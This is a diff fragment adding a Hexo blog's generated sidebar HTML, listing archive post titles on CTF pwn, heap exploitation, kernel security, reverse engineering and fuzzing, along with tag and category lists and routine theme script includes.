+            <a class="archive-post-title" href="/2025/08/07/Ret2HarmonyOS-Frida%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%85%A5%E9%97%A8/">Ret2HarmonyOS: Frida环境搭建和入门</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span>
+            <a class="archive-post-title" href="/2025/06/08/aliyunctf-beebee%E5%A4%8D%E7%8E%B0/">aliyunctf-beebee复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span>
+            <a class="archive-post-title" href="/2025/05/19/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B5%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">网安实践之简单的固件漏洞利用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span>
+            <a class="archive-post-title" href="/2025/04/30/%E5%9F%BA%E4%BA%8ELLM%E7%9A%84kdump%E5%88%86%E6%9E%90%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">基于LLM的kdump分析开发日志（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span>
+            <a class="archive-post-title" href="/2025/04/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus/">从0开始的AFL++</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span>
+            <a class="archive-post-title" href="/2025/04/14/DefCon33-Qual/">DefCon33 Qual</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2025/04/07/Algorithm-leetcode/">Algorithm-leetcode</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span>
+            <a class="archive-post-title" href="/2025/03/28/SRC%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">漏洞挖掘入门（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span>
+            <a class="archive-post-title" href="/2025/03/24/%E5%86%85%E6%A0%B8fuzzing-Syzkaller%E5%88%9D%E6%8E%A2/">内核fuzzing--Syzkaller初探</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span>
+            <a class="archive-post-title" href="/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/">基于qemu和ubuntu-base的kdump分析环境</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span>
+            <a class="archive-post-title" href="/2025/03/17/2025ciscnccb%E5%A4%8D%E7%9B%98%E5%B0%8F%E8%AE%B0/">2025ciscnccb复盘小记</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span>
+            <a class="archive-post-title" href="/2025/03/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E8%AF%86%E5%88%AB/">常见的加密编码算法逆向识别</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span>
+            <a class="archive-post-title" href="/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/">简短的IO函数特性整理——受scanf启发</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span>
+            <a class="archive-post-title" href="/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/">2023ciscn决赛awdp复现思路</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span>
+            <a class="archive-post-title" href="/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/">Awdp-PWN准备技巧</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span>
+            <a class="archive-post-title" href="/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/">Arch安装备忘手册</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span>
+            <a class="archive-post-title" href="/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">linux杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span>
+            <a class="archive-post-title" href="/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/">IDA-Better_printk推广</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span>
+            <a class="archive-post-title" href="/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/">ciscn_ccb2025初赛-avm重做wp</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/">前端小实践之修复github列表渲染错误</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span>
+            <a class="archive-post-title" href="/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/">How2Heap总集篇导演剪辑剧场版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/12</span>
+            <a class="archive-post-title" href="/2024/12/12/rust-pwn-qwb2024-chat-with-me/">How2Heap-rust——qwb2024_chat-with-me</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/">CHOP——强网杯2024expect_number wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/">How2Heap实战——强网杯2024babyheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/">How2Heap实战——网鼎杯database wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/30</span>
+            <a class="archive-post-title" href="/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">页表之上——Linux内核的内存管理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span>
+            <a class="archive-post-title" href="/2024/10/28/Algorithm-0/">Algorithm(0)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span>
+            <a class="archive-post-title" href="/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/">记录一次护网行动</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span>
+            <a class="archive-post-title" href="/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/">Android逆向入门之2015-AliCrackme</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span>
+            <a class="archive-post-title" href="/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/">Kernel Pwn从入门到入土-2</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span>
+            <a class="archive-post-title" href="/2024/10/08/CVE-2024-26229%E9%9D%92%E6%98%A5%E7%89%88-WindowsKernelPWn/">CVE-2024-26229青春版_WindowsKernelPWN</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span>
+            <a class="archive-post-title" href="/2024/10/06/%E7%8E%B0%E4%BB%A3%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E4%BB%A5Windows-11%E7%9A%84kernel-pwn%E4%B8%BA%E4%BE%8B/">现代内核安全机制——以Windows 11的kernel pwn为例</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span>
+            <a class="archive-post-title" href="/2024/09/25/ByteCTF2024%E2%80%94%E2%80%94ezheap/">ByteCTF2024——ezheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span>
+            <a class="archive-post-title" href="/2024/09/24/Algorithm-1/">Algorithm(1)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span>
+            <a class="archive-post-title" href="/2024/09/24/Algorithm-2/">Algorithm(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span>
+            <a class="archive-post-title" href="/2024/09/19/STL%E5%AE%B9%E5%99%A8%E9%80%86%E5%90%91%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8CSTLWP/">STL容器逆向——逆向工程实验STLWP</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span>
+            <a class="archive-post-title" href="/2024/09/19/Windows%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C2022WP/">Windows函数隐藏——逆向工程实验2022WP</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span>
+            <a class="archive-post-title" href="/2024/09/16/WMCTF2024evm%E9%9D%9E%E9%A2%84%E6%9C%9F/">WMCTF2023evm非预期</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span>
+            <a class="archive-post-title" href="/2024/09/11/Windows%E4%B8%8B%E7%9A%84%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">Windows下的简单逆向分析入门——从PE开始</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span>
+            <a class="archive-post-title" href="/2024/09/10/LLVM%E5%88%86%E6%9E%90%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/">LLVM-Pass分析简单入门——暨2024WMCTF-babysignin WP</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span>
+            <a class="archive-post-title" href="/2024/09/05/How2Heap-Protobuf%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024EzBuf/">How2Heap&Protobuf实战——CISCN2024EzBuf</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/GO-rust%E7%AD%89%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91/">GO,rust等其他语言的逆向</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2024/09/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%9D%E6%8E%A2/">虚拟机初探</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/30</span>
+            <a class="archive-post-title" href="/2024/08/30/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024-EzHeap/">How2Heap实战(2)——CISCN2024EzHeap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span>
+            <a class="archive-post-title" href="/2024/08/05/sandbox/">Sandbox  简单介绍</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2024/07/31/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-0/">Kernel Pwn从入门到入土-0</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2024/07/31/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-1/">Kernel Pwn从入门到入土-1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span>
+            <a class="archive-post-title" href="/2024/07/28/How2Heap-8%E2%80%94%E2%80%94Tcache/">How2Heap(8)——Tcache</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span>
+            <a class="archive-post-title" href="/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">How2Heap(7)——Large Bin Attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2024/07/18/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024/">How2Heap实战(1)——CISCN2024orange_cat_diary</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span>
+            <a class="archive-post-title" href="/2024/07/11/CSAPP-Labs%E2%80%94%E2%80%94Malloc-Lab/">CSAPP Labs——Malloc Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2024/07/04/CSAPP-Labs%E2%80%94%E2%80%94Attack-Lab/">CSAPP Labs——Attack Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span>
+            <a class="archive-post-title" href="/2024/06/06/CSAPP-Labs%E2%80%94%E2%80%94Bomb-Lab/">CSAPP Labs——Bomb Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span>
+            <a class="archive-post-title" href="/2024/06/05/CSAPP-Labs%E2%80%94%E2%80%94Data-Lab/">CSAPP Labs——Data Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span>
+            <a class="archive-post-title" href="/2024/05/13/%E7%94%B5%E8%84%91%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%95%B4%E7%90%86/">电脑问题解决方案整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman & House of Rabbit</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/">分享会</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2024/03/23/%E6%A0%88%E6%BA%A2%E5%87%BAROP%E7%86%9F%E7%BB%83%E5%BA%A6%E6%8F%90%E5%8D%87tips/">栈溢出ROP熟练度提升总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2024/02/05/Rust-Rust-3/">Rust？Rust！(3)——自用整合终极版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span>
+            <a class="archive-post-title" href="/2024/01/25/How2Heap-5/">How2Heap(5)——Unsorted bin attack & House of Lore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2024/01/23/%E5%93%88%E5%B7%A5%E5%A4%A7%E9%9D%92%E8%AE%AD%E8%90%A5%E8%AE%B0%E5%BD%95%E6%95%B4%E5%90%88%E5%8C%85/">青训营记录整合包</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span>
+            <a class="archive-post-title" href="/2024/01/22/IO-FILE/">IO_FILE——File Stream Oriented Programming (1)</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span>
+            <a class="archive-post-title" href="/2023/12/30/How2Heap-4/">How2Heap(4)——House of Orange & House of Einhejar</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span>
+            <a class="archive-post-title" href="/2023/12/27/ubuntu16-04-docker-%E5%AE%89%E8%A3%85pwndbg%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/">ubuntu16.04 docker环境踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span>
+            <a class="archive-post-title" href="/2023/12/26/Rust-Rust-2/">Rust？Rust！(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2023/12/17/How2Heap-3/">How2Heap(3)—House of Force & House of Gods.</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span>
+            <a class="archive-post-title" href="/2023/12/14/Rust%EF%BC%9FRust%EF%BC%81-1/">Rust？Rust！(1)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2023/12/03/How2Heap-2/">How2Heap(2)-Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/%E9%80%86%E5%90%91%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">逆向杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2023/11/09/How2Heap-1/">How2Heap(1)-fastbin（完整版）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2023/11/06/%E5%AF%B9%E8%B7%B3%E8%A1%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E9%9D%99%E6%80%81%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">对跳表机制及其静态逆向的一些想法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/pwntools%E7%9A%84shellcode%E9%80%BB%E8%BE%91%E8%AF%A6%E8%A7%A3/">pwntools的shellcode逻辑详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/my-first-blog/">my_first_blog</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="awdp">
+                <span class="iconfont-archer">&#xe606;</span>
+                awdp
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="wp">
+                <span class="iconfont-archer">&#xe606;</span>
+                wp
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="算法">
+                <span class="iconfont-archer">&#xe606;</span>
+                算法
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Android">
+                <span class="iconfont-archer">&#xe606;</span>
+                Android
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="awd">
+                <span class="iconfont-archer">&#xe606;</span>
+                awd
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="php">
+                <span class="iconfont-archer">&#xe606;</span>
+                php
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="heap">
+                <span class="iconfont-archer">&#xe606;</span>
+                heap
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="chop">
+                <span class="iconfont-archer">&#xe606;</span>
+                chop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CSAPP">
+                <span class="iconfont-archer">&#xe606;</span>
+                CSAPP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Lab">
+                <span class="iconfont-archer">&#xe606;</span>
+                Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="go">
+                <span class="iconfont-archer">&#xe606;</span>
+                go
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="basic">
+                <span class="iconfont-archer">&#xe606;</span>
+                basic
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Windows">
+                <span class="iconfont-archer">&#xe606;</span>
+                Windows
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CVE">
+                <span class="iconfont-archer">&#xe606;</span>
+                CVE
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="protobuf">
+                <span class="iconfont-archer">&#xe606;</span>
+                protobuf
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="FSOP">
+                <span class="iconfont-archer">&#xe606;</span>
+                FSOP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="kernel">
+                <span class="iconfont-archer">&#xe606;</span>
+                kernel
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="llvm">
+                <span class="iconfont-archer">&#xe606;</span>
+                llvm
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fuzz">
+                <span class="iconfont-archer">&#xe606;</span>
+                fuzz
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="exploit">
+                <span class="iconfont-archer">&#xe606;</span>
+                exploit
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="vm">
+                <span class="iconfont-archer">&#xe606;</span>
+                vm
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Vuln">
+                <span class="iconfont-archer">&#xe606;</span>
+                Vuln
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shellcode">
+                <span class="iconfont-archer">&#xe606;</span>
+                shellcode
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="sandbox">
+                <span class="iconfont-archer">&#xe606;</span>
+                sandbox
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Others">
+                <span class="iconfont-archer">&#xe606;</span>
+                Others
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fuzzing">
+                <span class="iconfont-archer">&#xe606;</span>
+                fuzzing
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="前端">
+                <span class="iconfont-archer">&#xe606;</span>
+                前端
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="kdump">
+                <span class="iconfont-archer">&#xe606;</span>
+                kdump
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="IDA">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                编译
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="hvv">
+                <span class="iconfont-archer">&#xe606;</span>
+                hvv
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="WP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            WP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="linux">
+            <span class="iconfont-archer">&#xe60a;</span>
+            linux
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="CSAPP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CSAPP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Reverse">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Reverse
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Kernel">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Kernel
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="How2Heap">
+            <span class="iconfont-archer">&#xe60a;</span>
+            How2Heap
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Develop">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Develop
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Android">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Android
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Exploits">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Exploits
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Exploit">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Exploit
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="others">
+            <span class="iconfont-archer">&#xe60a;</span>
+            others
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="kernel">
+            <span class="iconfont-archer">&#xe60a;</span>
+            kernel
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Web">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Web
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://zjw1nd.github.io",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
